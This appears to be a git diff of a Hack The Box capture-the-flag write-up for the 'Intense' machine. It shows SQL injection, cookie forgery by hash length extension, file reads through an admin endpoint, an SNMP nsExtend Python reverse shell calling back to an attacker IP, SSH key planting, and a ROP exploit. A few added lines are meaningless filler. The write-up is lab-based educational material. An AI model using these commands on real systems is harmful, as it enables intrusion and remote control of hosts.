@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/6a3e25b8957399691d3aa9c575baa3c419c9aba4/linux-machines/hard/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-intense-infocard.png)
 
 Short description to include any strange things to be dealt with - Linux hard difficulty
 
@@ -24,6 +24,8 @@ I started my enumeration with an nmap scan of `10.10.10.195`. The options I regu
 
 only port 22 and port 80 were open
 
+![](../../.gitbook/assets/1-port80.png)
+
 port 80
 
 > Hello ! You can login with the username and password guest.
@@ -32,11 +34,19 @@ port 80
 
 Has link to `src.zip`
 
+![](../../.gitbook/assets/2-guest-login.png)
+
 > One day, an old man said "there is no point using automated tools, better to craft his own".
 
 Hint that automated tools will not work here?
 
-found input box that seemed to hint at sql injection vulnerability
+![](../../.gitbook/assets/3-message-submit.png)
+
+found an input box and of course I had to see what kind of vulnerabilities it might have
+
+![](../../.gitbook/assets/4-syntax-error.png)
+
+After testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing it for a short time I decided to look into the code from the `src.zip` I downloaded from the main page.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -97,25 +107,31 @@ app
 13 directories, 38 files
 ```
 
-The file src.zip contained source code templates for the website
+The file `src.zip` contained source code templates for the website.
 
-from admin.py found a few paths to check out; the admin page was forbidden, the two log paths required POST rather than GET requests
+![](../../.gitbook/assets/6-adminpy.png)
 
-Looks like I will need an admin token
+from admin.py found a few paths to check out; 
 
-Looking at the reqest to the page there is a cookie header
+![](../../.gitbook/assets/5-admin.png)
+
+the admin page was forbidden, 
+
+![](../../.gitbook/assets/6-adminlog.png)
+
+the two log paths required POST rather than GET requests.  Looks like I will need an admin token.  
 
 ```text
 Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.7B6PiygW8lDO84yRQABGvGfw0ttyTDTwk0h+GEEFpgI=
 ```
 
-decoded the base64
+Looking at the request to the page in Burp there is a cookie header
 
 ```text
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
 ```
 
-the auth cookie contains the username, a secret, and some kind of binary garbage appended to the string; I needed a way to get the secret for a user `admin` \(from the source code\)
+ decoded the base64.  the auth cookie contains the username, a secret, and some kind of binary garbage appended to the string; I needed a way to get the secret for a user `admin` \(from the source code\)
 
 ```text
 from flask import Flask, request, render_template, g, redirect, url_for,\
@@ -203,7 +219,7 @@ if __name__ == "__main__":
     app.run()
 ```
 
-.py contained a few interesting methods; submit message restricted the messages to les than 140 chars and also does some sort of "bad word" check to filter input. Afterwards it places the message in the database; I decided to check for SQL injection
+app.py contained a few interesting methods; submit message restricted the messages to les than 140 chars and also does some sort of "bad word" check to filter input. Afterwards it places the message in the database; I decided to check for SQL injection
 
 ```text
 from hashlib import sha256
@@ -388,11 +404,13 @@ def admin_list_log(logdir):
 
 utils.py also contained some interesting methods; the method `is_admin()` teslls me that the `admin` user has a role of `1`; `get_user()` and `try_login()` give me some example SQL queries to test; `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]`. Looks like I will not be able to execute code with my SQL injection
 
-picture
+![](../../.gitbook/assets/7-sqli.png)
 
 Pulling information from utils.py I crafted the query: `' AND select secret from users where username = admin and role =1`
 
 and it looked like I was getting an error that points towards a SQL injection vulnerability; now I just had to find out what kind of query would return either the password or secret
+
+![](../../.gitbook/assets/7-sqli-close.png)
 
 `a') UNION SELECT password FROM users --` results in `no such column: password`, but substituting password with secret makes the message get submitted to the database with no return
 
@@ -418,17 +436,21 @@ was encountering a problem with my output only matching zero for the secret unti
 
 From the information in the cookie I already have, I could see that the secret string `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec` was 64 characters long
 
+![](../../.gitbook/assets/8-intruder-payload.png)
+
 to test my theory I used Burp' Intruder to test a brute force of all alpha-numeric characters
 
-pics
+![](../../.gitbook/assets/8-intruder-test%20%281%29.png)
 
-I was successful, and found that the first character in the admin's secret was `'f'`. From this I used python to write a brute force program to iterate through all 64 characters in the secret
+tests
 
-To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
+![](../../.gitbook/assets/8-intruder-first-f.png)
 
-To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
+I was successful, and found that the first character in the admin's secret was `'f'`. From this I used python to write a brute force program to iterate through all 64 characters in the secret. The following sources helped me:
 
-To get the runtime of a program or method: [https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution](https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution)
+* To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
+* To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
+* To get the run-time of a program or method: [https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution](https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution)
 
 ```python
 import requests
@@ -481,7 +503,9 @@ b¾nTÁu µí§
 sm`Æ
 ```
 
-crafted my new auth cookie, then base64 it `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
+crafted my new auth cookie, then base64'd it `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
+
+![](../../.gitbook/assets/9-broke-site.png)
 
 Using this cookie however broke the whole site, and made it so no pages would load. I figured it had something to do with the unreadable characters that were appended to the end of the secret in the cookie.
 
@@ -543,13 +567,43 @@ for some reason the hashpumpy module added the guest cookie to the admin cookie,
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
 ```
 
+![](../../.gitbook/assets/9-welcomeadmin.png)
+
+sucessful login
+
 the `admin.py` mentions using the `logfile` and `logdir` properties, along with the POST method after logging in as admin
 
-through burp was able to get /etc/passwd; only two users can login, root and user
+![](../../.gitbook/assets/10-etcpasswd.png)
+
+through burp was able to get /etc/passwd; only two users can login, root and user; noticed debian\_snmp so decided to see what I could find on that service
+
+![](../../.gitbook/assets/10-snmpd-conf.png)
+
+snmpd.conf - found Read/Write community string for SNMP of `SuP3RPrivCom90`
+
+![](../../.gitbook/assets/10-ssh-conf.png)
+
+ssh.conf - nothing useful
+
+![](../../.gitbook/assets/10-success-ornot.png)
+
+dh
+
+![](../../.gitbook/assets/10-user-folder.png)
+
+sgs
+
+![](../../.gitbook/assets/10-user-ssh.png)
+
+atga
+
+![](../../.gitbook/assets/10-user-txt.png)
+
+This was interesting...it isn't very often that I am able to get the user flag through web requests.
 
 ## Initial Foothold
 
-in /etc/passwd noticed debian\_snmp so decided to see what I could find on that service
+
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -657,16 +711,6 @@ Unfortunately the isntalled version of nc did not have `-e` functionality
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
-NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
-NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
-NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
-```
-
-connected to my
-
-```text
-┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
@@ -692,6 +736,18 @@ NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 Timeout: No Response from 10.10.10.195
 ```
 
+I tried sending a reverse shell, but got an End-of-Line error
+
+```text
+┌──(zweilos㉿kali)-[~/htb/intense]
+└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
+NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
+NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
+NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
+```
+
+connected to my
+
 after trying a few things realized that some of the internal quotes needed to be escaped for it to run properly
 
 ```text
@@ -707,7 +763,7 @@ intense
 
 got a shell back on my waiting nc listener
 
-a strange problem I encountered with this snmp terminal...if I lose my shell I lose the ability to connect to this box. Not sure why or how, but resetting the machine does not help, and it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\)
+a strange problem I encountered with this snmp terminal...if I lost my shell I would lose the ability to connect back to this box. Not sure why or how, but it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\).  After it happened again later I reset the machine itself and this fixed it...
 
 ### Further enumeration
 
@@ -776,6 +832,10 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
 Downloaded a few interesting files from `user`'s home folder...then lost my shell again when I cancelled the http server \(right after I realized I should have put my ssh key there!\)
 
+
+
+Analysis of the note\_server.c code showed me that the program was looking for a connection to `127.0.0.1` on port 5001.  
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
@@ -838,60 +898,9 @@ ps -u root
    PID TTY          TIME CMD
      1 ?        00:00:04 systemd
      2 ?        00:00:00 kthreadd
-     4 ?        00:00:00 kworker/0:0H
-     6 ?        00:00:00 mm_percpu_wq
-     7 ?        00:00:00 ksoftirqd/0
-     8 ?        00:00:02 rcu_sched
-     9 ?        00:00:00 rcu_bh
-    10 ?        00:00:00 migration/0
-    11 ?        00:00:00 watchdog/0
-    12 ?        00:00:00 cpuhp/0
-    13 ?        00:00:00 cpuhp/1
-    14 ?        00:00:00 watchdog/1
-    15 ?        00:00:00 migration/1
-    16 ?        00:00:00 ksoftirqd/1
-    18 ?        00:00:00 kworker/1:0H
-    19 ?        00:00:00 kdevtmpfs
-    20 ?        00:00:00 netns
-    21 ?        00:00:00 rcu_tasks_kthre
-    22 ?        00:00:00 kauditd
-    24 ?        00:00:00 khungtaskd
-    25 ?        00:00:00 oom_reaper
-    26 ?        00:00:00 writeback
-    27 ?        00:00:00 kcompactd0
-    28 ?        00:00:00 ksmd
-    29 ?        00:00:00 khugepaged
-    30 ?        00:00:00 crypto
-    31 ?        00:00:00 kintegrityd
-    32 ?        00:00:00 kblockd
-    33 ?        00:00:00 ata_sff
-    34 ?        00:00:00 md
-    35 ?        00:00:00 edac-poller
-    36 ?        00:00:00 devfreq_wq
-    37 ?        00:00:00 watchdogd
-    39 ?        00:00:01 kworker/1:1
-
+    
 ...snipped...
-   302 ?        00:00:00 ttm_swap
-   303 ?        00:00:00 irq/16-vmwgfx
-   305 ?        00:00:00 kworker/1:1H
-   307 ?        00:00:00 kworker/0:1H
-   375 ?        00:00:00 raid5wq
-   425 ?        00:00:00 jbd2/sda2-8
-   426 ?        00:00:00 ext4-rsv-conver
-   491 ?        00:00:01 systemd-journal
-   492 ?        00:00:00 iscsi_eh
-   493 ?        00:00:00 ib-comp-wq
-   494 ?        00:00:00 ib_mcast
-   495 ?        00:00:00 ib_nl_sa_wq
-   496 ?        00:00:00 rdma_cm
-   506 ?        00:00:00 lvmetad
-   512 ?        00:00:00 systemd-udevd
-   589 ?        00:00:00 loop0
-   592 ?        00:00:00 loop1
-   757 ?        00:00:00 VGAuthService
-   758 ?        00:00:08 vmtoolsd
-  1068 ?        00:00:00 lxcfs
+
   1074 ?        00:00:00 note_server
   1123 ?        00:00:03 snapd
   1125 ?        00:00:00 networkd-dispat
@@ -1014,6 +1023,8 @@ doRop(rop)
 p.interactive()
 ```
 
+Copied and cleaned up the code from the official writeup, then ran it
+
 ### Root.txt
 
 ```text
@@ -1041,6 +1052,10 @@ intense
 $ cat /root/root.txt
 b3e42063bf6316157da49cbfae5e21d7
 ```
+
+sdg
+
+![](../../.gitbook/assets/11-pwned.png)
 
 Thanks to [`sokafr`](https://app.hackthebox.eu/users/19014) for something interesting or useful about this machine.
 
